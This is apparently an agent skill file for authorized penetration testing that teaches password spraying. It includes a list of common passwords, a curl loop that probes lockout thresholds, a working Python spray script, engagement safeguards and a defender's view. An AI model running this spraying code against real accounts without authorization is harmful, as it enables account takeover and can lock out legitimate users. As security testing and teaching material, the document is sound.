---
name: password-spraying
description: Use when testing one or a few common passwords across many
  accounts to avoid per-account lockouts on an authorized engagement.
  Covers target list building, password choice, timing to stay under
  lockout thresholds, and detecting lockout versus blocking. Use when the
  scope includes many accounts, when credential stuffing is too noisy, when
  assessing password reuse across an organization, or when testing cloud
  and VPN logins with strict lockout policies.
version: 1.0.0
domain: auth
lifecycle: stable
last_verified: 2026-10-23
parent: password-attacks
requires: [password-attacks]
extends: []
relates: [auth-attacks, osint-methodology]
tools:
  - name: Python
    version: 3.12
  - name: Burp Suite
    version: 2026.2
  - name: Hydra
    version: 9.5
---

Password spraying flips the dictionary attack: a few likely passwords
against many usernames, staying under per-account lockout thresholds. This
skill covers controlled spraying on authorized engagements: building the
user list, choosing passwords, timing the run around the lockout policy,
and reading results without locking anyone out. Spraying touches real
accounts, so it needs explicit approval, a known lockout policy, and
conservative timing.

## Quick Workflow

1. Get written approval naming the accounts or the account source.
2. Learn the lockout threshold and observation window from the client or
   from test accounts.
3. Build the username list from approved sources (never scrape without
   permission).
4. Choose a small password list: seasonal, company-themed, defaults.
5. Spray one password across all users, then wait out the window before
   the next.
6. Verify hits by hand and report immediately; a valid credential is
   time-sensitive.

## 1. Building the run

```bash
# Username list from the approved source, one per line, deduplicated
sort -u /tmp/raw_users.txt > /tmp/users.txt
wc -l /tmp/users.txt

# Small, likely password list (edit per target and season)
cat > /tmp/spray.txt <<'EOF'
Spring2026!
Welcome123
Password123
CompanyName2026!
Changeme123
EOF

# Learn the lockout policy on TEST accounts first
# Try 5 bad passwords against one test account, watch for lockout text
for i in 1 2 3 4 5 6; do
  curl -s -X POST 'https://target.example/login' \
    -d "username=testuser&password=Wrong$i" | grep -i -o 'locked.\{0,30\}' | head -1
  echo "attempt $i done"
done
```

If the client cannot state the policy, derive it from test accounts and
assume the strictest observed values for the real run.

## 2. The spray loop

```python
#!/usr/bin/env python3
"""Slow password spray: one password across all users per window."""
import time
import urllib.request
import urllib.parse

URL = "https://target.example/login"
FAIL = b"Invalid credentials"
LOCKOUT = b"locked"

def attempt(user, pwd):
    data = urllib.parse.urlencode({"username": user, "password": pwd}).encode()
    req = urllib.request.Request(URL, data=data)
    with urllib.request.urlopen(req, timeout=15) as r:
        body = r.read()
    if LOCKOUT in body:
        print(f"[!] lockout on {user}, aborting")
        raise SystemExit(1)
    return FAIL not in body

users = [l.strip() for l in open("/tmp/users.txt") if l.strip()]
passwords = [l.strip() for l in open("/tmp/spray.txt") if l.strip()]

for pwd in passwords:
    print(f"[*] spraying password {len(pwd)} chars across {len(users)} users")
    for user in users:
        if attempt(user, pwd):
            print(f"[+] HIT: {user}:{pwd}")
        time.sleep(30)  # 30s between attempts keeps any sane policy happy
    print("[*] window done, sleeping 70 minutes before next password")
    time.sleep(4200)
```

One password per lockout window is the safe pattern. Rushing the second
password is how accounts get locked and engagements get paused.

## Edge cases

- The policy is per-IP, not per-account. Your single source trips it
  fast; the finding is real (the control is weak against distributed
  attack), but stop and report rather than pushing through.
- Some accounts have MFA. A password hit behind MFA is still a finding
  about password reuse; note the MFA mitigation alongside.
- The user list contains service accounts. Exclude them unless the scope
  names them; locking a service account can break production.
- Responses are inconsistent. Re-verify every hit by hand immediately;
  spray tools misread nonstandard login responses.

## Escalation

- A lockout happens despite care: stop the run, inform the test lead at
  once, and help with unlocks per the agreed process; document the exact
  threshold you found.
- You need more passwords per window: only with written approval, and
  coordinate with the SOC so the alert spike is expected and attributed.
- A hit is confirmed: report it through the agreed sensitive channel the
  same day; credentials age fast and the client may want an immediate
  reset.

## Detection and defender view

Defenders see spraying as few passwords tried against many accounts from
one or few sources, often outside business hours. Good detection is
failed-login analytics grouped by source IP across accounts, not just per
account. Defenses are MFA, breached-password blocking, alerting on
cross-account failure patterns, and lockouts tuned to catch spraying
without letting attackers deny service to real users.

## Key references

- MITRE ATT&CK T1110.003 (Brute Force: Password Spraying).
- CWE-307 (Improper Restriction of Excessive Authentication Attempts).
- CWE-521 (Weak Password Requirements).
- OWASP Testing Guide: Testing for Weak Lock Out Mechanism.
